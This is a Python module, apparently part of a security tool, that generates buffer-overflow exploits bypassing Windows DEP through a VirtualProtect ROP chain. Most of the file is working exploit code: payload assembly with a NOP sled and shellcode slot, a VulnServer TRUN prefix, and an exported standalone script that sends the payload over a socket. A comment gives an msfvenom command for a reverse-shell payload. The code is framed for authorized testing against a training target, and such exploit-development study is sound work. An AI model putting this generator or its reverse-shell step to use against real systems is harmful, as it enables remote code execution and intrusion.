"""
Exploit Generator for VirtualProtect DEP Bypass

Generates complete exploit scripts from configuration and ROP chains.

Author: Anubhav Gain <anubhavg@infopercept.com>
"""

import struct
from typing import Optional
from .rop_builder import ROPChainBuilder
from .config import Config, TargetConfig


class ExploitGenerator:
    """
    Generates complete exploit payloads for VirtualProtect DEP bypass.

    This class combines the ROP chain with shellcode and proper buffer
    structure to create ready-to-use exploits.
    """

    # Sample shellcode placeholder (NOP sled for testing)
    PLACEHOLDER_SHELLCODE = b"\xCC" * 100  # INT3 breakpoints for debugging

    def __init__(self, config: Optional[TargetConfig] = None):
        """
        Initialize the ExploitGenerator.

        Args:
            config: Target configuration (optional, can be set later)
        """
        self.config = config
        self.rop_builder: Optional[ROPChainBuilder] = None
        self.shellcode: bytes = b""
        self._payload: bytes = b""

    def load_config(self, config: TargetConfig) -> "ExploitGenerator":
        """Load a target configuration."""
        self.config = config
        return self

    def set_shellcode(self, shellcode: bytes) -> "ExploitGenerator":
        """Set the shellcode to use in the exploit."""
        self.shellcode = shellcode
        return self

    def set_shellcode_from_file(self, filepath: str) -> "ExploitGenerator":
        """Load shellcode from a binary file."""
        with open(filepath, "rb") as f:
            self.shellcode = f.read()
        return self

    def _build_rop_chain(self) -> bytes:
        """Build the ROP chain from configuration."""
        if not self.config:
            raise ValueError("No configuration loaded")

        self.rop_builder = ROPChainBuilder()
        self.rop_builder.set_virtualprotect_iat(self.config.virtualprotect_iat)
        self.rop_builder.set_writable_address(self.config.writable_address)
        self.rop_builder.set_protection_size(self.config.protection_size)
        self.rop_builder.set_protection_flag(self.config.protection_flag)
        self.rop_builder.set_gadgets_from_dict(self.config.gadgets)

        return self.rop_builder.build()

    def generate_payload(
        self,
        prefix: bytes = b"",
        suffix: bytes = b"",
        use_placeholder: bool = False
    ) -> bytes:
        """
        Generate the complete exploit payload.

        Args:
            prefix: Bytes to prepend (e.g., command prefix)
            suffix: Bytes to append
            use_placeholder: If True, use placeholder shellcode

        Returns:
            Complete exploit payload
        """
        if not self.config:
            raise ValueError("No configuration loaded")

        shellcode = self.shellcode if not use_placeholder else self.PLACEHOLDER_SHELLCODE

        if not shellcode:
            raise ValueError("No shellcode set. Use set_shellcode() or use_placeholder=True")

        # Build components
        rop_chain = self._build_rop_chain()
        nop_sled = b"\x90" * self.config.nop_sled_size
        padding_a = b"A" * self.config.offset

        # Calculate remaining padding
        current_len = len(prefix) + len(padding_a) + len(rop_chain) + len(nop_sled) + len(shellcode)
        remaining = self.config.total_buffer_size - current_len
        padding_c = b"C" * max(0, remaining)

        # Build final payload
        self._payload = prefix + padding_a + rop_chain + nop_sled + shellcode + padding_c + suffix

        return self._payload

    def generate_vulnserver_trun_exploit(
        self,
        shellcode: Optional[bytes] = None
    ) -> bytes:
        """
        Generate a complete VulnServer TRUN exploit payload.

        Args:
            shellcode: Shellcode bytes (optional, uses set shellcode if not provided)

        Returns:
            Complete exploit payload for TRUN command
        """
        if shellcode:
            self.set_shellcode(shellcode)

        return self.generate_payload(prefix=b"TRUN /.:/ ")

    def export_python_exploit(
        self,
        target_ip: str = "192.168.0.100",
        target_port: int = 9999,
        output_file: Optional[str] = None
    ) -> str:
        """
        Export the exploit as a standalone Python script.

        Args:
            target_ip: Target IP address
            target_port: Target port
            output_file: Optional file to write the script to

        Returns:
            Python exploit script as string
        """
        if not self.config:
            raise ValueError("No configuration loaded")

        rop_chain = self._build_rop_chain()
        rop_hex = rop_chain.hex()

        script = f'''#!/usr/bin/env python3
"""
VirtualProtect DEP Bypass Exploit
Target: {self.config.name}

Generated by VirtualProtect Inspector
Author: Anubhav Gain <anubhavg@infopercept.com>
GitHub: https://github.com/anubhavg-icpl/virtual-protect-inspector

WARNING: This script is for authorized security testing only.
"""

import struct
import socket
import sys

# Target configuration
TARGET_IP = "{target_ip}"
TARGET_PORT = {target_port}
OFFSET = {self.config.offset}
TOTAL_BUFFER_SIZE = {self.config.total_buffer_size}
NOP_SLED_SIZE = {self.config.nop_sled_size}

# ROP Chain (pre-built)
ROP_CHAIN = bytes.fromhex("{rop_hex}")

# Shellcode placeholder - REPLACE WITH YOUR SHELLCODE
# Generate with: msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f python -b '\\x00'
SHELLCODE = (
    b"\\xcc" * 100  # INT3 breakpoints - replace with actual shellcode
)


def create_payload(prefix: bytes = b"") -> bytes:
    """Create the exploit payload."""
    payload = prefix
    payload += b"A" * OFFSET
    payload += ROP_CHAIN
    payload += b"\\x90" * NOP_SLED_SIZE
    payload += SHELLCODE
    payload += b"C" * (TOTAL_BUFFER_SIZE - len(payload))
    return payload


def send_exploit(target: tuple, payload: bytes) -> bool:
    """Send the exploit to the target."""
    try:
        with socket.create_connection(target, timeout=10) as sock:
            banner = sock.recv(512)
            print(f"[*] Banner: {{banner.decode('utf-8', errors='ignore').strip()}}")
            sock.send(payload)
            print(f"[+] Payload sent ({{len(payload)}} bytes)")
            return True
    except Exception as e:
        print(f"[-] Error: {{e}}")
        return False


def main():
    """Main exploit function."""
    print("=" * 60)
    print("VirtualProtect DEP Bypass Exploit")
    print(f"Target: {self.config.name}")
    print("=" * 60)

    target = (TARGET_IP, TARGET_PORT)
    print(f"[*] Target: {{TARGET_IP}}:{{TARGET_PORT}}")
    print(f"[*] Offset: {{OFFSET}}")
    print(f"[*] ROP Chain Size: {{len(ROP_CHAIN)}} bytes")
    print(f"[*] Shellcode Size: {{len(SHELLCODE)}} bytes")

    # For VulnServer TRUN command
    prefix = b"TRUN /.:/ "
    payload = create_payload(prefix)

    print(f"[*] Total Payload Size: {{len(payload)}} bytes")
    print()

    if input("[?] Send exploit? (y/N): ").lower() == 'y':
        if send_exploit(target, payload):
            print("[+] Exploit sent successfully!")
            print("[*] Check your listener for a shell...")
        else:
            print("[-] Exploit failed")
            sys.exit(1)
    else:
        print("[*] Aborted")


if __name__ == "__main__":
    main()
'''

        if output_file:
            with open(output_file, "w") as f:
                f.write(script)
            print(f"[+] Exploit script written to: {output_file}")

        return script

    def get_payload_info(self) -> dict:
        """Get information about the generated payload."""
        if not self._payload:
            return {"error": "No payload generated yet"}

        return {
            "total_size": len(self._payload),
            "offset": self.config.offset if self.config else 0,
            "rop_chain_size": len(self.rop_builder.build()) if self.rop_builder else 0,
            "shellcode_size": len(self.shellcode),
            "nop_sled_size": self.config.nop_sled_size if self.config else 0,
        }

    def __repr__(self) -> str:
        config_name = self.config.name if self.config else "None"
        return f"ExploitGenerator(config={config_name}, shellcode_size={len(self.shellcode)})"
